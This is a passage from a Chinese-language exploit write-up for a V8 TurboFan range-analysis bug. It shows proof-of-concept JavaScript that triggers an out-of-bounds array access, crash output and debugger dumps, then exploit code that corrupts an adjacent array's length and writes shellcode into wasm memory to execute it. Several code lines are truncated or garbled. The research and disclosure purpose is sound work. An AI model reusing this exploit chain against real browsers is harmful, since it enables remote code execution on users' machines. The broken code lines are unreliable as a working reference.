        //reality:NaN
        var x = Math.max(i,1); //
        //compiler:Range(-INF,-1)
        //reality:NaN
        x = -x; //
        //compiler:Range(-2,-1)
        //reality:NaN
        x = Math.max(x,-2);
        //compiler:Range(-2,-1)
        //reality:0
        x >>= 0; //
        //compiler:Range(0,1)
        //reality:2
        x += 2;
        //compiler:Range(0,7)
        //reality:Range(0,7)
        index &= 0x7;
        //compiler:Range(0,7)
        //reality:Range(0,14)
        index *= x;
        return a[index];
    }
这样可以使得编译器的估测值比真实运算结果小，由此发生溢出。运行发现程序直接崩溃
    root@ubuntu:~/Desktop/v8/out.gn/x64.bug# ./d8 poc.js --trace-turbo --allow-natives-syntax
    Concurrent recompilation has been disabled for tracing.
    undefined
    ---------------------------------------------------    Begin compiling method opt using TurboFan
    ---------------------------------------------------    Finished compiling method opt using TurboFan
    Trace/breakpoint trap (core dumped)
分析IR图，`checkbounds`的`Range(0,7)`在数组长度之内，在后续，该`checkbounds`会被移除
在`V8.TFEffectLinearization 369`阶段，已经没有了边界检查，因此也可以溢出
从IR图中，未分析出任何异常，因此，我们继续调试JIT代码
     R8   0x80000000
     R9   0x55f4d8748520 —▸ 0x17608100000 ◂— 0x40000
     R10  0x4023cccccccccccd
     R11  0x5
    *R12  0x17608243c81 ◂— 0x310000005408040b
     R13  0x17600000000 —▸ 0x7ffebe6b7a18 ◂— 0x17600000000
     R14  0x1760825009d ◂— 0x89000000e0080409
     R15  0x55f4d87144c0 —▸ 0x7f451f0e2360 (Builtins_WideHandler) ◂— lea    rbx, [rip - 7]
     RBP  0x7ffebe6b67b0 —▸ 0x7ffebe6b6810 —▸ 0x7ffebe6b6838 —▸ 0x7ffebe6b68a0 —▸ 0x7ffebe6b68f0 ◂— ...
     RSP  0x7ffebe6b6780 —▸ 0x7ffebe6b67c0 ◂— 0xa /* '\n' */
    *RIP  0x17600082d2b ◂— add    r8d, 2
    ───────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────
       0x17600082d12    mov    r11, qword ptr [rbp + 0x10]
       0x17600082d16    sar    r11d, 1
       0x17600082d19    movabs r12, 0x17608243a45
       0x17600082d23    mov    r12d, dword ptr [r12 + 3]
       0x17600082d28    add    r12, r13
     ► 0x17600082d2b    add    r8d, 2
调试中看出,在执行`x += 2;`时，x(寄存器r8)的值仍然为`0x80000000`，最终使得运算的下标为`R8
0x8000000a`，即有一个符号位的存在，因此，我们可以在最后添加一个移位操作，用于移除`NaN`计算造成的符号位。完整的OOB构造方法如下
    function opt(index) {
        var a = [1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];
        var x = -Infinity;
        var i = 0;
        for (; i >= 0; //
        //compiler:Range(0,1)
        //reality:2
        x += 2;
        //compiler:Range(0,7)
        //reality:Range(0,7)
        index &= 0x7;
        //compiler:Range(0,7)
        //reality:Range(0,14)
        index *= x;
        index >= 1;
        return a[index];
    }
    %PrepareFunctionForOptimization(opt);
    print(opt(5));
    %OptimizeFunctionOnNextCall(opt);
    print(opt(5));
    %SystemBreak();
    print(opt(5));
运行后发现成功溢出
    root@ubuntu:~/Desktop/v8/out.gn/x64.bug# ./d8 p.js --allow-natives-syntax
    undefined
    -8.864952837205469e-7
###  疑难问题
在构造过程中,`var x = Math.max(i,1);`和`x = Math.max(x,-2);`语句中的参数，位置不能调换，否则利用失败。  
这是因为`max`函数最终是会被转换为`Float64LessThan`函数，
而对于一个`NaN`，任何的比较都是false，因此在这个情况下，`max`运算的真实结果将会是第一个参数
    NaN == NaN
    false
    NaN  1
    false
而我们的目的就是要让`NaN`参与真实值的计算，因此，不能调换参数的位置。  
能否使用`var x = i = 1`，因此，`var x = i  1 ? i
: 1;`也不可行，它将使得i为`NaN`时，x的值为1。
###  exp编写
控制好对象布局，利用JIT的oob，覆写后方`Array`的length，从而构造一个自由溢出的`OOB Array`，然后后续就是简单的利用了。
    var buf = new ArrayBuffer(0x8);
    var dv = new DataView(buf);
    function p64f(value1,value2) {
       dv.setUint32(0,value1,true);
       dv.setUint32(0x4,value2,true);
       return dv.getFloat64(0,true);
    }
    function i2f64(value) {
       dv.setBigUint64(0,BigInt(value),true);
       return dv.getFloat64(0,true);
    }
    function u64f(value) {
       dv.setFloat64(0,value,true);
       return [dv.getUint32(0,true),dv.getUint32(4,true)];
    }
    function big2int(value) {
       dv.setBigUint64(0,BigInt(value),true);
       return dv.getUint32(0,true);
    }
    var a;
    var oob_arr;
    function opt(index,leak_or_write,val) {
        a = [1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8];
        oob_arr = new Array(1.1,2.2);
        var x = -Infinity;
        var i = 0;
        for (; i >= 0; //
        //compiler:Range(0,1)
        //reality:2
        x += 2;
        //compiler:Range(0,7)
        //reality:Range(0,7)
        index &= 0x7;
        //compiler:Range(0,7)
        //reality:Range(0,14)
        index *= x;
        /*两步的作用是清除符号位*/
        index >= 1;
        if (leak_or_write)
           return a[index];
       else {
          a[index] = val;
       }
    }
    for (var i=0;i> 32n),0);
    //替换wasm的shellcode
    for (var i=0;i<shellcode.length;i++) {
       adv.setUint32(i*4,shellcode[i],true);
    }
    //执行shellcode
    func();
    /*%DebugPrint(wasmInstance);
    %DebugPrint(oob_arr);
    %DebugPrint(arb_buf);
    %SystemBreak();
    */
## 0x04 感想
最近研究v8越来越上手了，以后还得继续努力。
## 0x05 参考
[论文Interprocedural Induction Variable
Analysis](https://www.docin.com/p-1633488008.html)  
[chromium
commit](https://chromium.googlesource.com/v8/v8.git/+/a2e971c56d1c46f7c71ccaf33057057308cc8484%5E!/)